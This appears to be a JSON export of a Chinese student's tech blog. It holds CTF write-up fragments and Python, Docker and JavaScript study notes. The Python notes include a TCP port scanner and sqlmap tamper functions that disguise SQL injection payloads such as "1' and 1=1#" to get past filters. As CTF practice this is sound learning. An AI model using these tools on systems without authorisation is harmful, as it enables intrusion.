这个题可以 cumt是密码 然后是mose编码我真是一个一个拼的，应该拿python脚本写比较好，毕竟pytho学得不太好 应该是这个，拼错了好几回 1CUMTCTF&#123;M0RS38MORSE8M0RS38MORSE8M0RSE8AND8MP3ST39O&#125; 大鲨鱼之你可劲找流量包分析，直接跟tcp流可以看见一个盲注的传输内容 是二分法 然后我就又又又自己拼写 拼错了好几回 1CUMTCTF&#123;cecc1394-6133-43d0-be06-a41c5f231dd4&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://pz1o.top/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://pz1o.top/tags/CTF/"},{"name":"题解","slug":"题解","permalink":"https://pz1o.top/tags/%E9%A2%98%E8%A7%A3/"}]},{"title":"python开发","slug":"python开发","date":"2020-08-13T11:20:57.000Z","updated":"2020-11-20T14:19:21.459Z","comments":true,"path":"2020/08/13/python开发/","link":"","permalink":"https://pz1o.top/2020/08/13/python%E5%BC%80%E5%8F%91/","excerpt":"","text":"前言顺便复习一下python，主要是掌握一下python的主流框架（Flask和Django ） FlaskURL和视图123456789101112131415161718192021222324252627# 从flask这个框架中导入Flask这个类from flask import Flask# 初始化一个Flask对象# Flask()# 需要传递一个参数__name__# 1. 方便flask框架去寻找资源# 2. 方便flask插件比如Flask-Sqlalchemy出现错误的时候，好去寻找问题所在的位置app = Flask(__name__)# @app.route是一个装饰器# @开头，并且在函数的上面，说明是装饰器# 这个装饰器的作用，是做一个url与视图函数的映射# 127.0.0.1:5000/ -&gt; 去请求hello_world这个函数，然后将结果返回给浏览器@app.route('/')def hello_world(): return '我是第一个flask程序'# 如果当前这个文件是作为入口程序运行，那么就执行app.run()if __name__ == '__main__': # app.run() # 启动一个应用服务器，来接受用户的请求 # while True: # listen() app.run() 设置debug模式 在app.run()中传入一个关键字参数debug,app.run(debug=True)，就设置当前项目为debug模式。 debug模式的两大功能： 当程序出现问题的时候，可以在页面中看到错误信息和出错的位置。 只要修改了项目中的python文件，程序会自动加载，不需要手动重新启动服务器。 使用配置文件 新建一个config.py文件 在主app文件中导入这个文件，并且配置到app中，示例代码如下： 12import configapp.config.from_object(config) URL传参到视图12345@app.route(&#39;&#x2F;user&#x2F;&lt;id&gt;&#39;)def users(id): return u&#39;您请求的参数是：&#123;&#125;&#39;.format(id)#参数需要放在两个尖括号中。#视图函数中需要放和url中的参数同名的参数。 反转URL 什么叫做反转URL：从视图函数到url的转换叫做反转url 反转url的用处： 在页面重定向的时候，会使用url反转。 在模板中，也会使用url反转。 12from flask import Flask,url_forprint url_for(&#39;users&#39;,id&#x3D;&#39;1&#39;) 页面跳转和重定向 用处：在用户访问一些需要登录的页面的时候，如果用户没有登录，那么可以让重定向到登录页面。 123form flask import redirect,url_forurl = url_for('users') users是视图函数redirect(url) jinja2模板模板渲染和参数1.如何渲染模板： 模板放在templates文件夹下 从flask中导入render_template函数。 在视图函数中，使用render_template函数，渲染模板。注意：只需要填写模板的名字，不需要填写templates这个文件夹的路径。 2.模板传参： 如果只有一个或者少量参数，直接在render_template函数中添加关键字参数就可以了。 如果有多个参数的时候，那么可以先把所有的参数放在字典中，然后在render_template中，使用两个星号，把字典转换成关键参数传递进去，这样的代码更方便管理和使用。 3.在模板中，如果要使用一个变量，语法是： 4.访问模型中的属性或者是字典，可以通过的形式，或者是使用. 123456789101112131415def index(): class Person(object): name = 'pz1o' age = 18 p = Person() #login_url = url_for('users') #return redirect(login_url) context = &#123; 'gender':'nan', 'person': p &#125; return render_template('index.html',**context) &lt;p&gt;&#123;&#123;person.name&#125;&#125;&lt;/p&gt;&lt;p&gt;&#123;&#123;person.age&#125;&#125;&lt;/p&gt; if和forif 12345678910111213&#123;% if xxx %&#125;&#123;% else %&#125;&#123;% endif %&#125;&#123;% if user%&#125; &lt;a href=\"#\"&gt;&#123;&#123; user.name &#125;&#125;&lt;/a&gt; &lt;a href=\"#\"&gt;注销&lt;/a&gt;&#123;% else %&#125; &lt;a href=\"#\"&gt;登录&lt;/a&gt; &lt;a href=\"#\"&gt;注册&lt;/a&gt;&#123;% endif %&#125; return render_template('index.html',user=user) for 字典的遍历，语法和python一样，可以使用items()、keys()、values()、iteritems()、iterkeys()、itervalues() 123&#123;% for k,v in user.items() %&#125; &lt;p&gt;&#123;&#123; k &#125;&#125;：&#123;&#123; v &#125;&#125;&lt;/p&gt;&#123;% endfor %&#125; 列表的遍历：语法和python一样。 123&#123;% for website in websites %&#125; &lt;p&gt;&#123;&#123; website &#125;&#125;&lt;/p&gt;&#123;% endfor %&#125; 过滤器 介绍和语法： 介绍：过滤器可以处理变量，把原始的变量经过处理后再展示出来。作用的对象是变量。 语法： 1&#123;&#123;avatar|default()&#125;&#125; default过滤器：如果当前变量不存在，这时候可以指定默认值。 1234#修改默认图片avatar = 'xxx'return render_template('index.html',avatar=avatar)&lt;img src='&#123;&#123;avatar|default('...')&#125;&#125;'&gt; length过滤器：求列表或者字符串或者字典或者元组的长度。 1234567891011121314151617181920212223#统计评论条数def index():comment = [ &#123; 'user':'pz1o', 'content':'xxx' &#125;, &#123; 'user':'lzy', 'content':'xxxx' &#125; ] return render_template('index.html',comments=comment) &lt;p&gt;评论数:&#123;&#123; comments|length &#125;&#125;&lt;/p&gt; &lt;ul&gt; &#123;% for i in comments %&#125; &lt;li&gt; &lt;a href=\"#\"&gt;&#123;&#123; i.user &#125;&#125;&lt;/a&gt; &lt;/li&gt; &lt;a &gt;&#123;&#123; i.content &#125;&#125;&lt;/a&gt; &#123;% endfor %&#125; &lt;/ul&gt; 继承和block123456#python中的继承class Person(object): name &#x3D; &#39;pz1o&#39; age &#x3D; 18class Student(Person): pass 继承作用和语法： 作用：可以把一些公共的代码放在父模板中，避免每个模板写同样的代码。 语法： 1&#123;% extends &#39;base.html&#39;%&#125; block实现： 作用：可以让子模板实现一些自己的需求。父模板需要提前定义好。 注意点：子模板中的代码，必须放在block块中。 123&#123;% block main %&#125; &lt;h1&gt;这是首页&lt;&#x2F;h1&gt;&#123;% endblock %&#125; python开发基础123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191#!/usr/bin/pythonprint('hello pz1o')#linux下执行chmod 777 python./a.py#优化生成pyopython -O -m py_compile a.pypython a.pyo#evala = '[1,2,3]'b = eval(a)print(b)#%格式化字符串#%c:asciia = 97print('i am %c'%a)#%x:16进制print('i am %x'%a)#%o:8进制print('i am %o'%a)#日期time = time.time()time.sleep(1)#args处理多余参数 args处理列表和元组 kwargs处理字典def sub(num1,num2,*args,**kwargs): print(num1-num2) print(args) print(kwargs)a = [5,3,2]sub(*a)2 (2,) &#123;&#125;sub(5,3,x=2)2 () &#123;'x': 2&#125;#文件操作#r只读 #w写入 删除原文件，重新写入，无则创建#a写入 文件末尾追加新的内容，无则创建#a+读写 文件末尾追加新的内容，无则创建#b 打开二进制文件with open('yyds.txt','r') as f: print(f.read())CUMTCTF&#123;1b8947a6f2b048c284515d8bd209c83f&#125; f.seek(7,0) print(f.read())&#123;1b8947a6f2b048c284515d8bd209c83f&#125;#f.seek('偏移量','选项')#选项为0时，从文件头部向后偏移#选项为1时，从当前位置偏移#选项为2时，从文件末向前偏移 #os模块os.mkdir('./yyds')os.rmdir('./yyds')os.listdir('./')os.getcwd()os.chdir('../') #改变当前工作目录os.system('dir') #返回状态,0为成功,1为失败res = os.popen('dir') #返回一个对象print(res.read())#捕捉异常try: 正常代码except 错误: 如果出现错误，执行这段代码finally: 最终执行这段代码 #网络编程#非常简易的扫描器import sysimport socketport = [21,22,23,80,135,139,443,1433,3306,3389]allports = [0,65535]def scan(ip,port,*args,**kwargs): s = socket.socket() try: s.connect((ip, port)) print(\"[+]The %s port %s is open\"%(ip,port)) return True except: print(\"[+]The %s port %s is closed\"%(ip,port)) return Falsedef ports(ip,port):#search some incoming specific parameters for p in port: scan(ip,p)def convert(array): a = [] for x in array: a.append(int(x)) return adef portsplus(ip,port):#search the parameters of an interval passed in for p in range(port[0],port[1]+1): scan(ip,p)if __name__ == '__main__': try: if len(sys.argv) &lt; 2: print('''[+]You can read the following rules to use this tool.[+]python scanport.py host ports[+]The Default scanports are 21,22,23,80,135,139,443,1433,3306,3389[+]python scanport.py 127.0.0.1 80,90,3306,3389[+]python scanport.py 127.0.0.1 80-90[+]python scanport.py 127.0.0.1 all ''') elif len(sys.argv) == 2: ports(sys.argv[1],port) else: ip = sys.argv[1] if ',' in sys.argv[2]: p = sys.argv[2] p = p.split(',') ports(ip,convert(p)) elif '-' in sys.argv[2]: p = sys.argv[2] p = p.split('-') portsplus(ip,convert(p)) elif sys.argv[2] == 'all': portsplus(ip,allports) else: port = int(sys.argv[2]) scan(ip,port) except: print('''[+]There is something wrong!!! ''') finally: print('''[+]The task has been completed!!! ''') #类和对象class Person: __age = 18 #私有属性 name = 'name' def __init__(self,name): self.name = name; def introduce(self): print(\"my name is %s,and my age is %d\"%((self.name),(self.__age))) def __hello(self):#私有方法 print(\"Hello!! My name is %s\"%(self.name))pz1o = Person('pz1o')pz1o.introduce()#公有方法调用print(pz1o._Person__age)#私有属性调用pz1o._Person__hello()#私有方法调用#tamper编写--tamper scan.py#绕空格def tamper(payload,**kwargs): retVal = payload if payload: retVal = \"\" for x in payload: if x.isspace(): retVal += \"/**/\" else: retVal += x return retValprint(tamper(\"1' and 1=1#\"))#不过滤引号里的内容def tamper(payload,**kwargs): retVal = payload if payload: retVal = \"\" flag = False for x in payload: if x == \"'\" or x == '\"': flag = not flag retVal += \"'\" elif x.isspace() and not flag: retVal += \"/**/\" else: retVal += x return retValprint(tamper(\"1' my name is pz1o' and 1=1#\"))","categories":[{"name":"开发","slug":"开发","permalink":"https://pz1o.top/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"开发","slug":"开发","permalink":"https://pz1o.top/tags/%E5%BC%80%E5%8F%91/"},{"name":"python","slug":"python","permalink":"https://pz1o.top/tags/python/"}]},{"title":"Docker学习","slug":"Docker学习","date":"2020-08-07T01:01:06.000Z","updated":"2020-11-20T14:18:44.308Z","comments":true,"path":"2020/08/07/Docker学习/","link":"","permalink":"https://pz1o.top/2020/08/07/Docker%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"前言白嫖的阿里云服务器不能浪费了，来学习一下docker,只记录一下重要的。 b站学习资源https://www.bilibili.com/video/BV1og4y1q7M4? Docker基础基本概念 镜像（ Image ） ：Docker 镜像是一个特殊的文件系统，除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。镜像不包含任何动态数据，其内容在构建之后也不会被改变。 容器（ Container ） ：镜像（ Image ）和容器（ Container ）的关系，就像是面向对象程序设计中的 类 和实例 一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。 仓库（ Repository ）：一个 Docker Registry 中可以包含多个仓库（ Repository ）；每个仓库可以包含多个标签（ Tag ）；每个标签对应一个镜像。 安装12345678910111213141516171819202122232425262728//1.卸载旧版本sudo yum remove docker \\ docker-client \\ docker-client-latest \\ docker-common \\ docker-latest \\ docker-latest-logrotate \\ docker-logrotate \\ docker-engine//2.需要安装安装包yum install -y yum-utils//3.设置镜像仓库yum-config-manager \\ --add-repo \\ http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo//4.更新yumyum makecache fast//5.安装dockeryum install docker-ce docker-ce-cli containerd.io一直y//6.启动dockersystemctl start docker//7.测试dockerdocker version docker run hello-world//8.docker镜像docker images 1234&#x2F;&#x2F;卸载dockeryum remove docker-ce docker-ce-cli containerd.iorm -rf &#x2F;var&#x2F;lib&#x2F;docker&#x2F;var&#x2F;lib&#x2F;docker docker 默认工作路径 run的流程 Docker与vm传统虚拟机技术是虚拟出一套硬件后，在其上运行一个完整操作系统，在该系统上再运行所需应用进程。容器内的应用进程直接运行于宿主的内核，容器内没有自己的内核，而且也没有进行硬件虚拟。因此容器要比传统虚拟机更为轻便。 常用命令12docker version &#x2F;&#x2F;版本信息docker info &#x2F;&#x2F;系统信息 文档：https://docs.docker.com/ 镜像命令 1234567891011docker images -a //列出所有镜像dokcer images -q //只显示id[root@/]# docker imagesREPOSITORY(镜像的仓库源) TAG(标签) IMAGE ID(镜像的id) CREATED(创建时间) SIZE(大小)hello-world latest bf756fb1ae65 7 months ago 13.3kBdocker search mysql //搜索镜像dokcer pull mysql[:tag] //下载镜像docker pull docker.io/library/mysql:latestdocker rmi -f id //删除镜像docker rmi -f $(docker images -aq) //删除全部镜像 容器命令 ==有镜像才可以创建容器，先安装一个centos== 123456789101112131415161718192021222324docker pull centosdocker run [参数] image //新建容器并启动--name=\"name1\" //容器名字-d //后台运行-P //随机把容器的端口映射到一个主机未使用的高端口-i //以交互模式运行容器，常与-t连用-t //为容器重新分配一个伪输入终端，常与-i连用-it //交互方式运行-p ip：主机端口：容器端口 //指定容器端口docker ps //正在运行的容器docker ps -a //历史运行的容器docker rm 容器id //删除容器docker rm -f $(docker ps -aq) //删除所有容器docker start 容器id //启动容器docker restart 容器id //重启容器docker stop 容器id //停止容器docker kill 容器id //杀死容器//进入容器docker run -it centos /bin/bash//退出容器exit 停止退出ctrl+p+q 不停止退出 从github复现CTF首先从github上clone下来 1git clone xxx 若有docker.yml直接 1234docker-compose builddocker-compose up -ddocker ps #查看端口号 如果有dockerfile 12345进入dockerfile目录设置权限docker build -t &#39;自定义镜像名称&#39; .(最后有一个点)docker run --name&#x3D;&#39;自定义容器名称&#39; -i -d -P 镜像名称 &#x2F;run.shdocker ps &#x2F;&#x2F;查看端口号 查看端口号 部署完成","categories":[{"name":"Docker","slug":"Docker","permalink":"https://pz1o.top/categories/Docker/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://pz1o.top/tags/Docker/"}]},{"title":"Javascript学习","slug":"javascript学习","date":"2020-07-09T08:36:24.000Z","updated":"2020-11-20T14:19:03.701Z","comments":true,"path":"2020/07/09/javascript学习/","link":"","permalink":"https://pz1o.top/2020/07/09/javascript%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"Javascript参考廖雪峰教程https://www.liaoxuefeng.com/wiki/1022910821149312 入门javascript引入javascript内部标签 1234&lt;script&gt; /... ..&lt;/script&gt; 外部引入 1&lt;script src=\"./..\"&gt;&lt;/script&gt; 基本语法123456789// 变量var num = 1;// 条件控制if()&#123;..&#125;else&#123;..&#125;//console.log(num) 数据类型变量 变量名是大小写英文、数字、$和_的组合，且不能用数字开头 1var $1 = \"a\"; 数字 123456123 //整数123.1 //浮点数1.1e1 //科学计数法NaN //not a number'abc' //字符串true //布尔值 比较运算符 123=== 等于（类型不一样，值一样）=== 绝对等于（类型一样，值一样） NaN===NaN是false，它与任何值都不相等，包括自己。 isNaN（NaN）会返回true。 数组 中括号 1var arr = [1,2,3,\"hello\"] 对象 大括号,每个属性用逗号隔开，最后不需要 123456789var person = &#123; name: \"111\", age: 3&#125;person.name&gt;111person.age&gt;3 strict模式在同一个页面的不同的JavaScript文件中，如果都不用var申明，恰好都使用了变量i，将造成变量i互相影响，产生难以调试的错误结果。 使用var申明的变量则不是全局变量，它的范围被限制在该变量被申明的函数体内（函数的概念将稍后讲解），同名变量在不同的函数体内互不冲突。 为了修补JavaScript这一严重设计缺陷，ECMA在后续规范中推出了strict模式，在strict模式下运行的JavaScript代码，强制通过var申明变量，未使用var申明变量就使用的，将导致运行错误。 1234'use strict';abc = \"\"hello world\";//使用strict模式上面代码会报错var abc = \"hello world\"; 字符串12345//转义字符\\n\\t'\\x41'; // 完全等同于 'A''\\u4e2d\\u6587'; // 完全等同于 '中文' 多行字符串由于多行字符串用\\n写起来比较费事，所以最新的ES6标准新增了一种多行字符串的表示方法，用反引号 ``表示 模板字符串要把多个字符串连接起来,可以用+也可以用`${..}表示 123456//+号var name = \"xiao\";console.log(123+name);//$&#123;&#125;var name = \"xiao\";console.log(`123$&#123;name&#125;`) 操作字符串 字符串是不可改变的，无论之后赋值，都不会改变。 123var s = \"a\";console.log(s.length); //长度console.log(s[0]); //输出 数组JavaScript的Array可以包含任意数据类型，并通过索引来访问每个元素。 123var arr = [1,2,3];arr.length;arr.length = 6; //可以通过给length赋值，改变数组的大小 对象JavaScript的对象是一种无序的集合数据类型，它由若干键值对组成。 123456789var xiao=&#123; name: 'xiao', age: 18, 'school': 'No.1'&#125;console.log(xiao.name)console.log(xiao['name']) //两种都可以访问xiao的name值console.log(xiao['school']) 由于JavaScript的对象是动态类型，你可以自由地给一个对象添加或删除属性. 12345678910var xiao=&#123; name: 'xiao',&#125;xiao.age=18;alert(xiao.age);delete xiao.age//可以用hasOwnProperty()方法来判断属性是否是自身拥有的xiao.hasOwnProperty('name') //truexiao.hasOwnProperty('age') //false 条件判断1234567891011121314&#x2F;&#x2F;单个判断if(...)&#123; ...&#125;else&#123; ...&#125;&#x2F;&#x2F;多行条件判断 if()&#123;..&#125;else if()&#123;..&#125;else&#123;&#125; JavaScript把null、undefined、0、NaN和空字符串&#39;&#39;视为false，其他值一概视为true. 循环123for(;;)&#123; ...;&#125; for循环最常用的地方就是遍历数组 123456var arr = [1,2,3];var i;for(i=0;i&lt;3;i++)&#123; console.log(arr[i]);&#125;//1 2 3 for in12345678910111213141516var o = &#123; name: 'bob', age: 18&#125;;for(var key in o)&#123; console.log(key); console.log(o[key]);&#125;//name age//bob 18//同样，数组中也可以用for...invar a = ['A','B','C'];for(var i in a)&#123; console.log(a[i]);&#125;//A B C while 123while(...)&#123; ...;&#125; do…while 123do&#123; ...&#125;while(...) Map和SetJavaScript的默认对象表示方式{}可以视为其他语言中的Map或Dictionary的数据结构，即一组键值对。 但是JavaScript的对象有个小问题，就是键必须是字符串。但实际上Number或者其他数据类型作为键也是非常合理的。 MapMap是一组键值对的结构，具有极快的查找速度。 初始化Map需要一个二维数组，或者直接初始化一个空Map。 12345678910//Map初始化var m = new Map();//增m.set('Bob',100);m.set('Pz1o',99);//删m.delete('Bob');//查m.has('Pz1o'); //truem.get('Pz1o'); //99 注意：一个key只能对应一个value，重复定义后面的值会覆盖掉前面的值。 SetSet和Map类似，也是一组key的集合，但不存储value。由于key不能重复，所以，在Set中，没有重复的key。 12345678910//set初始化var s = new Set([1,2,3]);//重复元素会被自动过滤var s = new Set([1,2,3,3]);//增s.add(4);//删s,delete(3);//查s; iterable遍历Array可以采用下标循环，遍历Map和Set就无法使用下标。为了统一集合类型，ES6标准引入了新的iterable类型，Array、Map和Set都属于**iterable类型。** 具有iterable类型的集合可以通过新的for ... of循环来遍历。 123456789101112131415var a = [1,2,3];var s = new Set([1,2,3]);var m = new Map([['A','a'],['Y','y']]);for(var i of a)&#123; console.log(i);&#125;//1 2 3for(var i of s)&#123; console.log(i);&#125;//1 2 3for(var i of m)&#123; console.log(i);&#125;//[\"A\",\"a\"] [\"Y\",\"y\"] for...in和for...of的不同点： for...in会遍历对象的所有属性名称，一个Array数组实际上也是一个对象，它的每个元素的索引被视为一个属性。 for...of则修复了这些问题，它只遍历循环集合的本身元素。 1234567&#x2F;&#x2F;forEach函数同样可以用来遍历var a &#x3D; [&#39;A&#39;,&#39;B&#39;,&#39;C&#39;];a.forEach(function(value,index,a)&#123; console.log(value+&#39;,&#39;+index);&#125;);&#x2F;&#x2F;A,0 B,1 C,2forEach(值,键,自身) 函数函数定义和调用定义函数 1234567891011121314function abs(...)&#123; ... ...&#125;//function 指明是函数的定义//abs是函数名称//(...)里面是参数//&#123;...&#125;是函数体//另一种定义方法var abs = function(..)&#123; ...&#125;;//在这种方式下，function(x)&#123; ... &#125;是一个匿名函数，它没有函数名。但是，这个匿名函数赋值给了变量abs，所以，通过变量abs就可以调用该函数。 请注意，函数体内部的语句在执行时，一旦执行到return时，函数就执行完毕，并将结果返回。因此，函数内部通过条件判断和循环可以实现非常复杂的逻辑。 如果没有return语句，函数执行完毕后也会返回结果，只是结果为undefined。 调用函数 123abs(10);abs(10,111); &#x2F;&#x2F;返回10abs(); &#x2F;&#x2F;返回NaN 由于JavaScript允许传入任意个参数而不影响调用，因此传入的参数比定义的参数多也没有问题。 arguments 1234//arguments(伪数组)//存储了用户的所有实参//伪数组 有length属性 是按照索引存储的fn(1,2,3) //arguments的数组就是1 2 3 实际上arguments最常用于判断传入参数的个数,以此来判断缺失参数。 rest 由于js中会接受接受多余的参数，所以用一个rest数组来表示多余的参数。rest参数只能写在最后，前面用...标识。 123456function fn(a,b,...rest)&#123;console.log(rest);return a+b;&#125;fn(1,2,3); //[3]fn(1,2) //[] 变量作用域与解构赋值如果一个变量在函数体内部申明，则该变量的作用域为整个函数体，在函数体外不可引用该变量。 如果两个不同的函数各自申明了同一个变量，那么该变量只在各自的函数体内起作用。换句话说，不同函数内部的同名变量互相独立，互不影响。 全局作用域 不在任何函数内定义的变量就具有全局作用域。实际上，JavaScript默认有一个全局对象window，全局作用域的变量实际上被绑定到window的一个属性。 123var a = 'A';console.log(a);console.log(window.a); 同样的，函数也是一个变量，也会绑定到windows对象。任何变量（函数也视为变量），如果没有在当前函数作用域中找到，就会继续往上查找，最后如果在全局作用域中也没有找到，则报ReferenceError错误。 名字空间 全局变量会绑定到window上，不同的JavaScript文件如果使用了相同的全局变量，或者定义了相同名字的顶层函数，都会造成命名冲突，并且很难被发现。减少冲突的一个方法是把自己的所有变量和函数全部绑定到一个全局变量中。 12345var Ma = 0;Ma.name = \"xiaoming\";Ma.fn = function()&#123; ....&#125;; 局部作用域 为了解决块级作用域，ES6引入了新的关键字let，用let替代var可以申明一个块级作用域的变量。 常量 ES6标准引入了新的关键字const来定义常量，const与let都具有块级作用域。 解构赋值 解构赋值就是同时对一组变量进行赋值。 12var [x, y, z] = ['hello', 'JavaScript', 'ES6'];console.log(x); 如果需要从一个对象中取出若干属性，也可以使用解构赋值，便于快速获取对象的指定属性。 12345678910111213var person = &#123; name : 'xiaoming', age : 18, university : &#123; specialities : 'cs' &#125;&#125;;//直接赋值var &#123;name,age&#125; = person;//嵌套对象的赋值var &#123;university : &#123;specialities&#125;&#125; = person;//如果想要的变量和对象的属性名不一样，可以如下操作var &#123;name:mz&#125; = person; 使用场景：解构赋值在很多时候可以大大简化代码。例如，交换两个变量x和y的值，可以这么写，不再需要临时变量。 12var x &#x3D; 1,y &#x3D; 2;[x , y] &#x3D; [y ,x]; 如果一个函数接收一个对象作为参数，那么，可以使用解构直接把对象的属性绑定到变量中。 方法在一个对象中绑定函数，称为这个对象的方法。 在一个方法内部，this是一个特殊变量，它始终指向当前对象，也就是xiaoming这个变量。所以，this.birth可以拿到xiaoming的birth属性。 12345678910111213function getAge() &#123; var y = new Date().getFullYear(); return y - this.birth;&#125;var xiaoming = &#123; name: '小明', birth: 1990, age: getAge&#125;;xiaoming.age(); // 30, 正常结果getAge(); // NaN 如果以对象的方法形式调用，比如xiaoming.age()，该函数的this指向被调用的对象，也就是xiaoming，这是符合我们预期的。 如果单独调用函数，比如getAge()，此时，该函数的this指向全局对象，也就是window。 123456789101112131415‘use strict’;var xiaoming = &#123; name : 'xiaoming', age : 18, math : 90, en : 99, grades : function()&#123; var that = this; //捕捉this指针 function getGrades()&#123; //进行重构 return that.math+that.en; &#125; return getGrades(); &#125;&#125; 高阶函数map由于map()方法定义在JavaScript的Array中，我们调用Array的map()方法，传入我们自己的函数，就得到了一个新的Array作为结果。 123var arr = [1,2,3];arr.map(x=&gt;x*2); //[2,4,6]arr.map(function(x)&#123;return x*2;&#125;); //[2,4,6] reducerray的reduce()把一个函数作用在这个Array的[x1, x2, x3...]上，这个函数必须接收两个参数，reduce()把结果继续和序列的下一个元素做累积计算。 1234567var arr = [x1,x2,x3,x4];arr.reduce((x,y)=&gt;(x+y)); //x1+x2+x3+x4var arr = [1, 3, 5, 7, 9];arr.reduce(function (x, y) &#123; return x * 10 + y;&#125;); // 13579 filterfilter也是一个常用的操作，它用于把Array的某些元素过滤掉，然后返回剩下的元素。 12345var arr = [1,2,3,4,5];var r = arr.filter(function(x)&#123; return x%2 !=0;&#125;)console.log(r); sortjs中排序算法是先把所有元素先转换为String再按照ascii码排序。 12345678var arr &#x3D; [10,20,1,2];var r &#x3D; arr.sort(function(x,y)&#123; if(x&lt;y)return 1; else if(x&gt;y)return -1; return 0;&#125;)console.log(arr) &#x2F;&#x2F;[20,10,2,1]console.log(r) &#x2F;&#x2F;[20,10,2,1] sort()方法会直接对Array进行修改，它返回的结果仍是当前Array。 闭包函数作为返回值 1234567891011function lazy_sum(arr) &#123; var sum = function () &#123; return arr.reduce(function (x, y) &#123; return x + y; &#125;); &#125; return sum;&#125;var f = lazy_sum([1,2,3,4]);f; //f是返回sum函数本身f(); //f()才是调用函数 箭头函数1234567891011121314//无&#123;&#125;的x =&gt; x*xfunction (x)&#123; return x*x;&#125;//返回多条x =&gt; &#123; ... return ; ... return ;&#125;//多个参数(x,y) =&gt; x*x+y*y//返回对象x =&gt; (&#123;foo:x&#125;); generatorgenerator由function*定义（注意多出的*号），并且，除了return语句，还可以用yield返回多次。 123456function* foo(x)&#123; yield x+1; yield x+2; return x+3;&#125;foo(2); 调用generator对象有两个方法， 一是不断地调用generator对象的next()方法next()方法会执行generator的代码，然后，每次遇到yield x;就返回一个对象{value: x, done: true/false}，然后“暂停”。返回的value就是yield的返回值，done表示这个generator是否已经执行结束了。如果done为true，则value就是return的返回值。 第二个方法是直接用for ... of循环迭代generator对象，这种方式不需要我们自己判断done。 12345678910//第一种var f = foo(2);f.next() //&#123;value: 3, done: false&#125;f.next() //&#123;value: 4, done: false&#125;f.next() //&#123;value: 5, done: true&#125;f.next() //&#123;value: undefined, done: true&#125;//第二种for(var x of foo(2))&#123; console.log(x);&#125; //3,4 标准对象 不要使用new Number()、new Boolean()、new String()创建包装对象； 用parseInt()或parseFloat()来转换任意类型到number； 用String()来转换任意类型到string，或者直接调用某个对象的toString()方法； 通常不必把任意类型转换为boolean再判断，因为可以直接写if (myVar) {...}； typeof操作符可以判断出number、boolean、string、function和undefined； 判断Array要使用Array.isArray(arr)； 判断null请使用myVar === null； 判断某个全局变量是否存在用typeof window.myVar === &#39;undefined&#39;； 函数内部判断某个变量是否存在用typeof myVar === &#39;undefined&#39;。 Date在JavaScript中，Date对象用来表示日期和时间。 1234var now &#x3D; new Date();now.getMilliseconds(); &#x2F;&#x2F;毫秒数now.getTime(); &#x2F;&#x2F;时间戳var d &#x3D; new Date(2020,6,30,8,39,30,123) &#x2F;&#x2F;自定义时间 RegExp基础\\d可以匹配一个数字 \\w可以匹配一个字母或数字 .可以匹配任意字符 *表示任意个字符 +表示至少一个字符 ?表示0个或1个字符 {n}表示n个字符 {n,m}表示n-m个字符 进阶要做更精确地匹配，可以用[]表示范围 [0-9a-zA-Z\\_]可以匹配一个数字、字母或者下划线； [0-9a-zA-Z\\_]+可以匹配至少由一个数字、字母或者下划线组成的字符串，比如&#39;a100&#39;，&#39;0_Z&#39;，&#39;js2015&#39;等等； [a-zA-Z\\_\\$][0-9a-zA-Z\\_\\$]*可以匹配由字母或下划线 d号开头，后接任意个由一个数字、字母或者下划线 d号组成的字符串，也就是JavaScript允许的变量名； [a-zA-Z\\_\\$][0-9a-zA-Z\\_\\$]{0, 19}更精确地限制了变量的长度是1-20个字符（前面1个字符+后面最多19个字符）。 A|B可以匹配A或B ^表示行的开头，^\\d表示必须以数字开头。 $表示行的结束，\\d$表示必须以数字结束。 js正则JavaScript有两种方式创建一个正则表达式： 第一种方式是直接通过/正则表达式/写出来，第二种方式是通过new RegExp(&#39;正则表达式&#39;)创建一个RegExp对象。 1234&#x2F;&#x2F;第一种var re1 &#x3D; &#x2F;ABC&#x2F;;&#x2F;&#x2F;第二种var re2 &#x3D; new RegExp(&#39;ABC&#39;); RegExp对象的test()方法用于测试给定的字符串是否符合条件。 12re2.test(&#39;ABC&#39;); &#x2F;&#x2F;truere2.test(&#39;abc&#39;); &#x2F;&#x2F; false 切分字符串 1234'a b c'.split(' '); // ['a', 'b', '', '', 'c']'a b c'.split(/\\s+/); // ['a', 'b', 'c']'a,b, c d'.split(/[\\s\\,]+/); // ['a', 'b', 'c', 'd']'a,b;; c d'.split(/[\\s\\,\\;]+/); // ['a', 'b', 'c', 'd'] 分组 用()表示的就是要提取的分组（Group） 123var re = /^(\\d&#123;3&#125;)-(\\d&#123;3,8&#125;)$/;re.exec('010-12345'); // ['010-12345', '010', '12345']re.exec('010 12345'); // null 如果正则表达式中定义了组，就可以在RegExp对象上用exec()方法提取出子串来。 exec()方法在匹配成功后，会返回一个Array，第一个元素是正则表达式匹配到的整个字符串，后面的字符串表示匹配成功的子串。 exec()方法在匹配失败时返回null。 *贪婪匹配需要特别指出的是，正则匹配默认是贪婪匹配，也就是匹配尽可能多的字符。举例如下，匹配出数字后面的0： 12var re &#x3D; &#x2F;^(\\d+)(0*)$&#x2F;;re.exec(&#39;102300&#39;); &#x2F;&#x2F; [&#39;102300&#39;, &#39;102300&#39;, &#39;&#39;] 由于\\d+采用贪婪匹配，直接把后面的0全部匹配了，结果0*只能匹配空字符串了。 必须让\\d+采用非贪婪匹配（也就是尽可能少匹配），才能把后面的0匹配出来，加个?就可以让\\d+采用非贪婪匹配： 12var re &#x3D; &#x2F;^(\\d+?)(0*)$&#x2F;;re.exec(&#39;102300&#39;); &#x2F;&#x2F; [&#39;102300&#39;, &#39;1023&#39;, &#39;00&#39;] 全局搜索 JavaScript的正则表达式还有几个特殊的标志，最常用的是g，表示全局匹配。正则表达式还可以指定i标志，表示忽略大小写，m标志，表示执行多行匹配。 作业 1234567//请尝试写一个验证Email地址的正则表达式。var re = 